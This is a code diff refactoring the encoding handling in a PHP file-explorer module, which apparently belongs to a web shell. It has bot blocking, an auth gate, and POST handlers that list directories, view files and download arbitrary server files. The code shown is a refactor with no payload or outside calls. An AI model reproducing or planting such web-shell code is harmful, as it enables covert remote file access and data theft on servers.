@@ -4,15 +4,12 @@ block_bot();
 auth();
 chdir(get_cwd());
 $nav = get_nav(get_cwd());
-$p = array_map("array_map_cb", get_post());
+$p = array_map("to_encode", get_post());
 $cwd = html_safe(get_cwd());
 $GLOBALS['module'] = array();
 
 function encode_cwd($cwd) {
-    if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
-        $cwd = convert_encode($GLOBALS['encode'], 'utf-8', $cwd);
-    }
-    return bin2hex($cwd);
+    return bin2hex(from_encode($cwd));
 }
 
 $explorer_content = "";
@@ -25,8 +22,7 @@ if(isset($p['viewEntry'])){
 		$nav = get_nav($dirname);
 		$cwd = html_safe($dirname);
 		$explorer_content = view_file($path, "auto");
-	}
-	elseif(is_dir($path)){
+	}elseif(is_dir($path)){
 		$path = realpath($path).DIRECTORY_SEPARATOR;
 		setcookie("cwd", encode_cwd($path));
 		chdir($path);
@@ -37,11 +33,9 @@ if(isset($p['viewEntry'])){
 }
 else $explorer_content = show_all_files(get_cwd());
 
-if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
-    $nav = convert_encode($GLOBALS['encode'], 'utf-8', $nav);
-    $cwd = convert_encode($GLOBALS['encode'], 'utf-8', $cwd);
-    $explorer_content = convert_encode($GLOBALS['encode'], 'utf-8', $explorer_content);
-}
+$nav = from_encode($nav);
+$cwd = from_encode($cwd);
+$explorer_content = from_encode($explorer_content);
 
 $GLOBALS['module']['explorer']['id'] = "explorer";
 $GLOBALS['module']['explorer']['title'] = "Explorer";
@@ -114,8 +108,7 @@ if(isset($p['cd'])){
 		if(isset($p['showfiles'])&&($p['showfiles']=='true')){
 			$res .= show_all_files($path);
 		}
-	}
-	else $res = "error";
+	}else $res = "error";
 	output($res);
 }
 elseif(isset($p['viewFile']) && isset($p['viewType'])){
@@ -308,10 +301,7 @@ elseif(isset($p['ulType'])){
 	output($res);
 }
 elseif(isset($p['df_token'])){
-	$file = rawurldecode(hex2bin(trim($p['df_token'])));
-    if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
-        $file = convert_encode('utf-8', $GLOBALS['encode'], $file);
-    }
+	$file = to_encode(rawurldecode(hex2bin(trim($p['df_token']))));
 	if(is_file($file)){
 		header("Content-Type: application/octet-stream");
 		header('Content-Transfer-Encoding: binary');
